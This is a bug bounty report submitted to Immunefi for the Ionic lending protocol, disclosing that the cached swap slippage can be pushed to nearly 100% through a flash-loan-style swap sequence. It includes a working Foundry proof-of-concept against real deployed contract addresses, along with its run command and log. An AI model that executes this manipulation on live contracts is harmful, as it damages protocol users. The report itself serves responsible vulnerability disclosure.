
# Cached slippage can be manipulated by the attacker to cause the contract calculate wrong amount of redeem collateral

Submitted on Mon Jun 17 2024 04:58:14 GMT-0400 (Atlantic Standard Time) by @perseverance for [IOP | Ionic](https://immunefi.com/bounty/ionic-iop/)

Report ID: #32265

Report type: Smart Contract

Target: https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol

Impacts:
- Contract fails to deliver promised returns, but doesn't lose value
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
# Description

## Brief/Intro

In calculation of redeem and supply amount, the LeveredPosition is using the cached slippage value. 

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol

```solidity
function _getSupplyAmountDelta(
    bool up,
    uint256 targetRatio,
    uint256 collateralAssetPrice,
    uint256 borrowedAssetPrice
  ) internal view returns (uint256 supplyDelta, uint256 borrowsDelta) {
    uint256 positionSupplyAmount = collateralMarket.balanceOfUnderlying(address(this));
    uint256 debtAmount = stableMarket.borrowBalanceCurrent(address(this));
    uint256 assumedSlippage;
    if (up) assumedSlippage = factory.liquidatorsRegistry().getSlippage(stableAsset, collateralAsset);
    else assumedSlippage = factory.liquidatorsRegistry().getSlippage(collateralAsset, stableAsset);
    uint256 slippageFactor = (1e18 * (10000 + assumedSlippage)) / 10000;
```

In _leverDown

```solidity
function _leverDown(uint256 targetRatio) internal {
    uint256 amountToRedeem;
    uint256 borrowsToRepay;

    BasePriceOracle oracle = pool.oracle();
    uint256 stableAssetPrice = oracle.getUnderlyingPrice(stableMarket);
    uint256 collateralAssetPrice = oracle.getUnderlyingPrice(collateralMarket);

    if (targetRatio <= 1e18) {
      // if max levering down, then derive the amount to redeem from the debt to be repaid
      borrowsToRepay = stableMarket.borrowBalanceCurrent(address(this));
      uint256 borrowsToRepayValueScaled = borrowsToRepay * stableAssetPrice;
      // accounting for swaps slippage
      uint256 assumedSlippage = factory.liquidatorsRegistry().getSlippage(collateralAsset, stableAsset);
      uint256 amountToRedeemValueScaled = (borrowsToRepayValueScaled * (10000 + assumedSlippage)) / 10000;
      amountToRedeem = amountToRedeemValueScaled / collateralAssetPrice;
```

The value slippage is taken from liquidatorsRegistry()

https://github.com/ionicprotocol/contracts/blob/0cec821e1dc76f73813d28ebf014c287eaa510b3/contracts/liquidators/registry/LiquidatorsRegistryExtension.sol#L57-L65

```
function getSlippage(IERC20Upgradeable inputToken, IERC20Upgradeable outputToken)
    external
    view
    returns (uint256 slippage)
  {
    slippage = conversionSlippage[inputToken][outputToken];
    // TODO slippage == 0 should be allowed
    if (slippage == 0) return MAX_SLIPPAGE;
  }
```

This cached value is taken from: 

https://github.com/ionicprotocol/contracts/blob/0cec821e1dc76f73813d28ebf014c287eaa510b3/contracts/liquidators/registry/LiquidatorsRegistryExtension.sol#L71-L103 

```solidity
function amountOutAndSlippageOfSwap(
    IERC20Upgradeable inputToken,
    uint256 inputAmount,
    IERC20Upgradeable outputToken
  ) external returns (uint256 outputAmount, uint256 slippage) {
    //...
if (prevValue == 0 || block.timestamp - conversionSlippageUpdated[inputToken][outputToken] > 5000) {
      emit SlippageUpdated(inputToken, outputToken, prevValue, slippage);

      conversionSlippage[inputToken][outputToken] = slippage;
      conversionSlippageUpdated[inputToken][outputToken] = block.timestamp;
    }
  //...
  }

```

## Vulnerability Details
### The vulnerability 

The cached slippage value can be manipulated by using the swap function. So the attackers can manipulate by using the flashloan to perfrom the swap using amountOutAndSlippageOfSwap. 
For example, with the token pairs Input token: Weth, output token: USDT, the liquidatorsRegistry_ will perform swap using the  AlgrebraSwapRouter. 
The attacker can use the amountOutAndSlippageOfSwap to manipulate the slippage to cause it to nearly 100%. 


Step 1: Call flashloan to borrow Weth. Manipulate the market condition of AlgebraSwap by perform swap via the AlgrebraSwapRouter to decrease the price of USDT

Step 2: Perform swap using amountOutAndSlippageOfSwap to increase the cached slippage 

Step 3: Swap back USDT to Weth using AlgrebraSwapRouter to restore the market condition to get back the token Weth to repay the flashloan. 


So by doing so, the slippage can be nearly 100%. 


# Impacts
# About the severity assessment

The cached slippage can be nearly 100%. In the POC, I demonstrated that it can be  This will cause the calculation in contract LeveredPosition to be wrong to redeem more than enough the CollateralMarket token. 

I want to submit this vulnerable as Low or Insight for the projects to consider more thoroughly this attack scenario. However, I tried and did not see attack vectors to gain big money benefit from this slippage manipulation, other than wrong calculation. But this should be consider more thoroughly. 

Severity: Low or Insight 
Impact category: 
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
- Contract fails to deliver promised returns, but doesn't lose value
        
## Proof of concept


 

#  Proof of concept


Step 1: Call flashloan to borrow Weht. Manipulate the market condition of AlgebraSwap by perform swap via the AlgrebraSwapRouter to decrease the price of USDT. In the POC, I simulated the flashloan by calling (deal function of Foundry). 

Step 2: Perform swap using amountOutAndSlippageOfSwap to increase the cached slippage 

Step 3: Swap back USDT to Weth using AlgrebraSwapRouter to restore the market condition to get back the token Weth to repay the flashloan. 

POC code: 

```solidity
  function testManipulateSlippageUSDTWeth() public {
      address USDT = 0xf0F161fDA2712DB8b566946122a5af183995e2eD; 
      address Weth = 0x4200000000000000000000000000000000000006; 
      address attacker = address(this); 
      
      deal(Weth, address(this), 100e18);
      address AlgrebraSwapRouter = 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8; 
      address liquidatorsRegistry_ = 0xc71B968C6C23e2723Bae32957D815C9bE3ca1b34; 
      console.log("Weth balance of this contract: ", IERC20Upgradeable(Weth).balanceOf(attacker));
      
      IERC20Upgradeable(Weth).approve(address(AlgrebraSwapRouter), 90e18);
      ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
        Weth,
        USDT,
        attacker,
        block.timestamp,
        90e18,
        0, // amountOutMinimum
        0 // limitSqrtPrice
      );
      ISwapRouter(AlgrebraSwapRouter).exactInputSingle(params);
      uint256 inputAmount = 10e18; 
      IERC20Upgradeable(Weth).approve(address(liquidatorsRegistry_), inputAmount);
      uint256 slippage = LiquidatorsRegistryExtension(liquidatorsRegistry_).getSlippage(IERC20Upgradeable(Weth), IERC20Upgradeable(USDT));
      console.log("Slippage: ", slippage);
      LiquidatorsRegistryExtension(liquidatorsRegistry_).amountOutAndSlippageOfSwap(IERC20Upgradeable(Weth),inputAmount,IERC20Upgradeable(USDT)); 
      slippage = LiquidatorsRegistryExtension(liquidatorsRegistry_).getSlippage(IERC20Upgradeable(Weth), IERC20Upgradeable(USDT));
      console.log("Slippage: ", slippage);
      uint256 USDT_balance = IERC20Upgradeable(USDT).balanceOf(attacker);
      IERC20Upgradeable(USDT).approve(address(AlgrebraSwapRouter), USDT_balance);
      params = ISwapRouter.ExactInputSingleParams(
        USDT,
        Weth,
        attacker,
        block.timestamp,
        USDT_balance,
        0, // amountOutMinimum
        0 // limitSqrtPrice
      );
      ISwapRouter(AlgrebraSwapRouter).exactInputSingle(params);
      console.log("Weth balance of this contract: ", IERC20Upgradeable(Weth).balanceOf(attacker));
      console.log("USDT balance of this contract: ", IERC20Upgradeable(USDT).balanceOf(attacker));

    }
```

To run test: 
```

forge test --match-test testManipulateSlippageUSDTWeth --match-contract ModeWethUSDTLeveredPositionTest -vvvvvv

```

Test log: 
```

[PASS] testManipulateSlippageUSDTWeth() (gas: 2191379)
Logs:
  max ratio: 1885965991544220436
  min ratio: 1001765749757541381
  Weth balance of this contract:  100000000000000000000
  USDT balance of this contract:  0
  Slippage:  900
  Slippage:  9979
  Weth balance of this contract:  99608291142735463429
  USDT balance of this contract:  0

```

Full Test case: 
https://gist.github.com/Perseverancesuccess2021/3f1a0c0754247c1148e5e97b37be1b4d

Get full test case and replace the file: contracts\contracts\test\LeveredPositionTest.t.sol 
Run command 
```
forge test --match-test testManipulateSlippageUSDTWeth --match-contract ModeWethUSDTLeveredPositionTest -vvvvvv
```


Test Log full: here: 
https://gist.github.com/Perseverancesuccess2021/3f1a0c0754247c1148e5e97b37be1b4d
